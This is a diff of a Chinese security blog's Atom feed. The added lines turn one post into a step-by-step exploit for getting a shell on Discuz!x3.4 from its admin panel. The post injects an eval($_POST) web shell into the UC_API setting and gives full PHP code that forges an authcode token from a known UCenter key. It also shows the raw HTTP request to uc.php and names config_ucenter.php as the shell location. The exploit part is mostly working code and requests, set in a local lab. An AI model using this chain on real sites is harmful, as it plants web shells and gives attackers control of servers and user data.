@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://www.svenbeast.com/</id>
     <title>斯文beast | 世界很大，你我很小</title>
-    <updated>2020-05-20T14:17:27.718Z</updated>
+    <updated>2020-05-20T15:54:54.006Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://www.svenbeast.com/"/>
     <link rel="self" href="http://www.svenbeast.com/atom.xml"/>
@@ -11,16 +11,130 @@
     <icon>http://www.svenbeast.com/favicon.ico</icon>
     <rights>All rights reserved 2020, 斯文beast | 世界很大，你我很小</rights>
     <entry>
-        <title type="html"><![CDATA[Discuz!x3.4 后台修改uc_center配置getshell]]></title>
+        <title type="html"><![CDATA[Discuz!x3.4 后台修改UCenter配置getshell]]></title>
         <id>http://www.svenbeast.com/post/discuzx34-hou-tai-xiu-gai-uc_center-pei-zhi-getshell/</id>
         <link href="http://www.svenbeast.com/post/discuzx34-hou-tai-xiu-gai-uc_center-pei-zhi-getshell/">
         </link>
         <updated>2020-05-20T12:50:06.000Z</updated>
         <content type="html"><![CDATA[<h3 id="0x01-背景">0x01 背景</h3>
 <pre><code>2020年5月20日。。。
-最近换了本子，有点不适应，各种安软件安环境，然后又改了博客样式，终于可以发文章拉，对新本子的颜值和速度很满意，附图小小的秀一把
+帮朋友测试时遇到了discuz!x3.4，由此记录一下，感谢QAX A-team的干货帖子拉~
+最近换了本子，有点不适应，各种安软件安环境然后又改了博客样式，终于可以发文章拉
+对新本子的颜值和速度很满意，附图小小的秀一把
 </code></pre>
 <figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1589983144183.png" alt="" loading="lazy"></figure>
+<h3 id="0x02-主题">0x02 主题</h3>
+<ul>
+<li>环境搭建：windows+phpstudy+Discuz!x3.4</li>
+<li>Discuz!x3.4：https://www.github.com</li>
+</ul>
+<h3 id="0x03-利用">0x03 利用</h3>
+<ul>
+<li>
+<ol>
+<li>进入后台<code>站长</code>-<code>UCenter设置</code>，修改UCenter通信密钥为123456并<code>记录下来</code>，修改UC_API=<code>http://192.168.0.106/discuz!x3.4/uc_server');eval($_POST[sven]);//</code>，点击保存</li>
+</ol>
+<p><img src="http://www.svenbeast.com//post-images/1589986312712.png" alt="" loading="lazy"><br>
+<img src="http://www.svenbeast.com//post-images/1589986439989.png" alt="" loading="lazy"></p>
+</li>
+<li>
+<ol start="2">
+<li>生成code参数的值(code.php代码见末尾)</li>
+</ol>
+</li>
+</ul>
+<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1589986948935.png" alt="" loading="lazy"></figure>
+<p><code>生成code值</code></p>
+<pre><code>&lt;?php
+$uc_key=&quot;123456&quot;;//此处填写刚才UCenter设置的值
+$time = time() + 720000;
+$str = &quot;time=&quot;.$time.&quot;&amp;action=updateapps&quot;;
+$code = authcode($str,&quot;ENCODE&quot;,$uc_key);
+$code = str_replace('+','%2b',$code);
+$code = str_replace('/','%2f',$code);
+echo $code;
+
+function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
+  $ckey_length = 4;
+  $key = md5($key != '' ? $key : '123456');
+  $keya = md5(substr($key, 0, 16));
+  $keyb = md5(substr($key, 16, 16));
+  $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
+
+  $cryptkey = $keya.md5($keya.$keyc);
+  $key_length = strlen($cryptkey);
+
+  $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
+  $string_length = strlen($string);
+
+  $result = '';
+  $box = range(0, 255);
+
+  $rndkey = array();
+  for($i = 0; $i &lt;= 255; $i++) {
+    $rndkey[$i] = ord($cryptkey[$i % $key_length]);
+  }
+
+  for($j = $i = 0; $i &lt; 256; $i++) {
+    $j = ($j + $box[$i] + $rndkey[$i]) % 256;
+    $tmp = $box[$i];
+    $box[$i] = $box[$j];
+    $box[$j] = $tmp;
+  }
+
+  for($a = $j = $i = 0; $i &lt; $string_length; $i++) {
+    $a = ($a + 1) % 256;
+    $j = ($j + $box[$a]) % 256;
+    $tmp = $box[$a];
+    $box[$a] = $box[$j];
+    $box[$j] = $tmp;
+    $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
+  }
+
+  if($operation == 'DECODE') {
+    if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
+      return substr($result, 26);
+    } else {
+      return '';
+    }
+  } else {
+    return $keyc.str_replace('=', '', base64_encode($result));
+  }
+}
+?&gt;
+</code></pre>
+<ul>
+<li>
+<ol start="3">
+<li>带code参数GET发送请求(发送这个请求前后台功能都是不正常的，发送后后台恢复正常)<br>
+<img src="http://www.svenbeast.com//post-images/1589987534699.png" alt="" loading="lazy"></li>
+</ol>
+</li>
+</ul>
+<p><code>请求数据包</code></p>
+<pre><code>GET /discuz!x3.4/api/uc.php?code=ac7091oTLALD6X24gZeiX5YmqDkLnX4ivIqx1jDnA7NhUAcHHOX3fWWOLWpGwSwfQfz4r5Pgf86bRlDTRkQ% HTTP/1.1
+Host: 192.168.0.106
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,ar;q=0.8
+Connection: close
+Content-Length: 133
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;root&gt;
+&lt;item id=&quot;UC_API&quot;&gt;http://192.168.0.106/discuz!x3.4/uc_server&lt;/item&gt;
+&lt;/root&gt;
+</code></pre>
+<ul>
+<li>
+<ol start="4">
+<li>此时 <code>http://192.168.0.106/discuz!x3.4/config/config_ucenter.php</code>就是我们的shell地址，至此getshell结束</li>
+</ol>
+</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="http://www.svenbeast.com//post-images/1589989434631.png" alt="" loading="lazy"></figure>
 ]]></content>
     </entry>
     <entry>
